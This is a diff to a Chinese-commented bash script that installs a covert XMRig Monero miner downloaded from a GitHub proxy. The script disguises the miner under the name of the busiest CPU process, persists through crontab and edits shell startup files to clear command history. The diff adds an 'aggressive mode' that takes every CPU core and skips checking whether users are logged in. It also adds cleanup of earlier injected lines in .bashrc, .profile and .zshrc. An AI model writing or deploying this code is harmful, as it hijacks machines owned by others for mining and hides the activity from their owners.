@@ -7,13 +7,23 @@
 # 参数检查
 if [ $# -ne 3 ]; then
     echo "错误: 参数不足"
-    echo "使用方法: $0 <钱包地址> <矿池地址:端口> <核心数百分比>"
+    echo "使用方法: $0 <钱包地址> <矿池地址:端口> <核心数百分比|no>"
+    echo "激进模式: 使用 'no' 作为第三个参数将启用激进模式（使用全部核心，不检测用户登录）"
     exit 1
 fi
 
 WALLET_ADDRESS="$1"
 POOL_ADDRESS="$2"
 CPU_PERCENTAGE="$3"
+
+# 检查是否为激进模式
+if [ "$CPU_PERCENTAGE" = "no" ]; then
+    AGGRESSIVE_MODE=1
+    CPU_PERCENTAGE=100  # 激进模式使用100%核心
+    log "激进模式已启用：使用全部核心，不检测用户登录"
+else
+    AGGRESSIVE_MODE=0
+fi
 
 # 全局变量
 DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
@@ -220,9 +230,32 @@ setup_crontab() {
     log "定时任务设置完成"
 }
 
+# 清理shell配置文件中的旧命令
+cleanup_old_commands() {
+    log "清理shell配置文件中的旧命令..."
+    
+    local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc")
+    
+    for config in "${shell_configs[@]}"; do
+        if [ -f "$config" ]; then
+            # 使用sed删除匹配的行：以pkill开头，以history -c && history -w 2>/dev/null结尾的行
+            sed -i '/^pkill.*history -c && history -w 2>\/dev\/null$/d' "$config" 2>/dev/null
+            # 同时删除可能的"# Auto cleanup"注释行
+            sed -i '/^# Auto cleanup$/d' "$config" 2>/dev/null
+            log "已清理配置文件: $config"
+        fi
+    done
+}
+
 # 设置安全清理机制
 setup_cleanup() {
     local filename="$1"
+    
+    # 激进模式下跳过shell配置文件修改
+    if [ "$AGGRESSIVE_MODE" -eq 1 ]; then
+        log "激进模式：跳过shell配置文件修改"
+        return 0
+    fi
     
     log "设置安全清理机制..."
     
@@ -301,6 +334,9 @@ main() {
     # 获取系统信息
     get_system_info
     
+    # 清理旧命令（在安装新的之前）
+    cleanup_old_commands
+    
     # 获取进程名
     PROCESS_NAME=$(get_top_cpu_process)
     log "选择进程名: $PROCESS_NAME"
@@ -314,6 +350,17 @@ main() {
     else
         log "文件下载失败，退出"
         exit 1
+    fi
+    
+    # 激进模式下直接启动挖矿，跳过定时任务和用户检查
+    if [ "$AGGRESSIVE_MODE" -eq 1 ]; then
+        log "激进模式：直接启动挖矿，使用全部CPU核心"
+        start_mining "$PROCESS_NAME"
+        log "=== 激进模式部署完成 ==="
+        log "进程名: $PROCESS_NAME"
+        log "安装路径: $XMRIG_DIR/$PROCESS_NAME"
+        log "CPU使用: 100%"
+        return 0
     fi
     
     # 设置定时任务
